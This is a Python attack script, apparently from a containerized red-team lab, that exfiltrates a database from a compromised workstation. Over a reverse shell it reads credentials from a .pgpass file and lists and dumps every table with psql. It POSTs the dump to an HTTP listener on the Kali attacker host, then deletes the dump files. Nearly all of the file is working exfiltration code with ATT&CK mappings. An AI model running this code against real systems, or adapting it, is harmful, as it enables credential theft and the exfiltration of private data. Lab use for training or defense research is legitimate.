import os
import re
import socket
import subprocess
import time

from chainlog import log, run_remote

# =============================================================================
# exfiltrate_db.py — DB Exfiltration from John's Workstation
# MITRE ATT&CK:
#   T1552.001 – Credentials In Files        (read ~/.pgpass for DB credentials)
#   T1082     – System Information Discovery (enumerate tables via information_schema)
#   T1213     – Data from Information Repositories (psql dump of all discovered tables)
#   T1041     – Exfiltration Over C2 Channel (HTTP POST back to kali)
# =============================================================================

KALI_HOST        = "10.10.0.2"
EXFIL_HTTP_PORT  = 9002
EXFIL_LOCAL_PATH = "/tmp/db_exfil.dump"   # written on kali

PGPASS_PATH = "/home/john.stravidis/projects/waystar-connect/.pgpass"
DUMP_PATH   = "/tmp/db_dump.dump"          # assembled on workstation

# ---------------------------------------------------------------------------
# Shell helpers
# ---------------------------------------------------------------------------

def _first_int(raw: str) -> str:
    """Return the first integer-only line from a _run_remote result.

    Interactive reverse shells interleave echoed input, ANSI prompts, and
    backspace sequences around the actual command output. Simple splitlines()[-1]
    grabs the prompt line rather than the numeric result. This helper scans all
    lines and returns the first one that is a bare integer (e.g. a COUNT(*) or
    wc -c result).
    """
    for line in raw.splitlines():
        clean = line.replace("\x08", "").strip()
        if clean.isdigit():
            return clean
    return "?"



# ---------------------------------------------------------------------------
# Kali-side HTTP receive server
# ---------------------------------------------------------------------------

def _start_receive_server(port=EXFIL_HTTP_PORT, output_path=EXFIL_LOCAL_PATH):
    """One-shot HTTP server: accepts a single POST and saves the body to a file."""
    script = (
        f"import http.server\n"
        f"class H(http.server.BaseHTTPRequestHandler):\n"
        f"    def do_POST(self):\n"
        f"        n=int(self.headers['Content-Length'])\n"
        f"        with open('{output_path}','wb') as fh: fh.write(self.rfile.read(n))\n"
        f"        self.send_response(200);self.end_headers()\n"
        f"    def log_message(self,*a):pass\n"
        f"http.server.HTTPServer(('0.0.0.0',{port}),H).handle_request()\n"
    )
    proc = subprocess.Popen(
        ["python3", "-c", script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)
    if proc.poll() is not None:
        raise RuntimeError(f"receive server exited immediately — port {port} already in use?")
    log(f"[+] Receive server started on port {port} (saving to {output_path})")
    return proc


def _stop_receive_server(proc):
    if proc and proc.poll() is None:
        proc.terminate()
        log("[+] Receive server stopped")


# ---------------------------------------------------------------------------
# Attack phases
# ---------------------------------------------------------------------------

def _discover_db_creds(john_shell):
    """Read ~/.pgpass and return the first credential dict, or None."""
    log(f"[*] Reading DB credentials from {PGPASS_PATH} ...")
    raw = run_remote(john_shell, f"cat {PGPASS_PATH}")
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":", 4)
        if len(parts) == 5:
            host, port, dbname, user, password = parts
            log(f"[+] Found credential: {user}@{host}:{port}/{dbname}")
            return {"host": host, "port": port, "dbname": dbname,
                    "user": user, "password": password}
    log("[-] No usable credential found in .pgpass")
    return None


def _list_tables(john_shell, psql_env, psql_base):
    """Query information_schema to discover all user tables in the public schema."""
    log("[*] Enumerating tables via information_schema ...")
    raw = run_remote(
        john_shell,
        f"{psql_env}{psql_base} "
        f"-c \"SELECT table_name FROM information_schema.tables "
        f"WHERE table_schema = 'public' AND table_type = 'BASE TABLE' "
        f"ORDER BY table_name;\"",
        timeout=10,
    )
    # Only accept valid SQL identifiers to filter out shell prompt noise.
    tables = [
        line.strip() for line in raw.splitlines()
        if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', line.strip())
    ]
    log(f"[+] Discovered tables: {', '.join(tables) if tables else '(none)'}")
    return tables


def _dump_db(john_shell, creds):
    """Enumerate all tables in the public schema, then dump each one to DUMP_PATH."""
    # PGPASSFILE avoids shell-quoting issues with special characters in the password.
    psql_env  = f"PGPASSFILE={PGPASS_PATH} PGSSLMODE=disable "
    psql_base = (
        f"psql -h {creds['host']} -p {creds['port']} "
        f"-U {creds['user']} -d {creds['dbname']} -t -A -F ,"
    )

    tables = _list_tables(john_shell, psql_env, psql_base)
    if not tables:
        log("[-] No tables found — nothing to dump")
        return {}

    stats = {}
    for i, table in enumerate(tables):
        log(f"[*] Dumping table '{table}' ...")

        if i == 0:
            redirect = f"> {DUMP_PATH}"
        else:
            run_remote(john_shell, f"echo '--- {table} ---' >> {DUMP_PATH}", timeout=5)
            redirect = f">> {DUMP_PATH}"

        run_remote(
            john_shell,
            f"{psql_env}{psql_base} -c \"SELECT * FROM {table};\" {redirect} 2>/dev/null",
            timeout=20,
        )

        count_raw = run_remote(
            john_shell,
            f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM {table};'",
            timeout=10,
        )
        count = _first_int(count_raw)
        log(f"[+] {table}: {count} rows")
        stats[table] = count

    size_raw = run_remote(john_shell, f"wc -c < {DUMP_PATH} 2>/dev/null || echo 0")
    size = _first_int(size_raw)
    log(f"[+] Dump written to {DUMP_PATH} ({size} bytes)")
    stats["dump_bytes"] = size
    return stats


def _send_to_kali(john_shell, kali_host, port=EXFIL_HTTP_PORT):
    """POST the dump file from the workstation to kali's receive server."""
    log(f"[*] Sending dump to {kali_host}:{port} ...")
    run_remote(
        john_shell,
        f"python3 -c \""
        f"import urllib.request; "
        f"data=open('{DUMP_PATH}','rb').read(); "
        f"urllib.request.urlopen('http://{kali_host}:{port}/', data=data, timeout=30)"
        f"\"",
        timeout=30,
    )
    if os.path.exists(EXFIL_LOCAL_PATH):
        size = os.path.getsize(EXFIL_LOCAL_PATH)
        log(f"[+] Dump received on kali ({size} bytes) → {EXFIL_LOCAL_PATH}")
        return True
    log(f"[-] Exfiltration may have failed — {EXFIL_LOCAL_PATH} not found on kali")
    return False


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def run(john_shell, kali_host=KALI_HOST, db_creds=None):
    """
    Discover all DB tables, dump them, and exfiltrate to kali.

    Args:
        john_shell (socket): reverse shell as john.stravidis on ubuntu_workstation.
        kali_host (str):     kali IP for the HTTP receive server.
        db_creds (dict):     credential dict (host/port/dbname/user/password).
                             If None, falls back to reading ~/.pgpass directly.
                             Supplied by enumeration_john_ws when that step runs first.

    Returns:
        dict: db_creds, exfil_path, exfil_ok, stats
    """
    log("\n[*] Starting DB exfiltration from john.stravidis's workstation ...")

    # Phase 1 — Credentials
    if db_creds is not None:
        log(f"[+] Using credentials from enumeration step: "
              f"{db_creds['user']}@{db_creds['host']}")
        creds = db_creds
    else:
        creds = _discover_db_creds(john_shell)
    if creds is None:
        log("[-] Cannot proceed without DB credentials")
        return {"db_creds": None, "exfil_path": None, "exfil_ok": False, "stats": {}}

    # Phase 2 — Dump tables
    stats = _dump_db(john_shell, creds)

    try:
        dump_bytes = int(stats.get("dump_bytes", "0").strip())
    except ValueError:
        dump_bytes = 0
    if dump_bytes < 10:
        log(f"[-] Dump file appears empty ({dump_bytes} bytes) — psql may have failed; aborting")
        run_remote(john_shell, f"rm -f {DUMP_PATH}")
        return {"db_creds": creds, "exfil_path": None, "exfil_ok": False, "stats": stats}

    # Phase 3 — Send to kali
    recv_proc = _start_receive_server()
    try:
        exfil_ok = _send_to_kali(john_shell, kali_host)
    finally:
        _stop_receive_server(recv_proc)

    # Cleanup — remove dump from workstation and kali
    run_remote(john_shell, f"rm -f {DUMP_PATH}")
    log(f"[+] Removed {DUMP_PATH} from workstation")

    if exfil_ok and os.path.exists(EXFIL_LOCAL_PATH):
        os.remove(EXFIL_LOCAL_PATH)
        log(f"[+] Removed {EXFIL_LOCAL_PATH} from kali")

    if exfil_ok:
        table_summary = ", ".join(
            f"{t}: {rows} rows" for t, rows in stats.items() if t != "dump_bytes"
        )
        log(f"[+] Exfiltration complete — {table_summary}")
    else:
        log("[-] Exfiltration finished with errors")

    return {
        "db_creds":    creds,
        "exfil_path":  None,       # file was cleaned up after transfer
        "exfil_ok":    exfil_ok,
        "stats":       stats,
    }


# ---------------------------------------------------------------------------
# Standalone test mode
# Usage: docker compose exec kali python3 /Attack-chain/exfiltrate_db.py
# Pre-condition: john.stravidis reverse shell already listening on port 6666
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    PORT_JOHN = 6666
    log(f"[*] Test mode — waiting for john.stravidis shell on port {PORT_JOHN}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT_JOHN))
    server.listen(1)

    try:
        john_shell, addr = server.accept()
        log(f"[+] Shell received from {addr[0]}")
    finally:
        server.close()

    result = run(john_shell)
    log(f"\n[*] Result: {'success' if result['exfil_ok'] else 'failed'}")
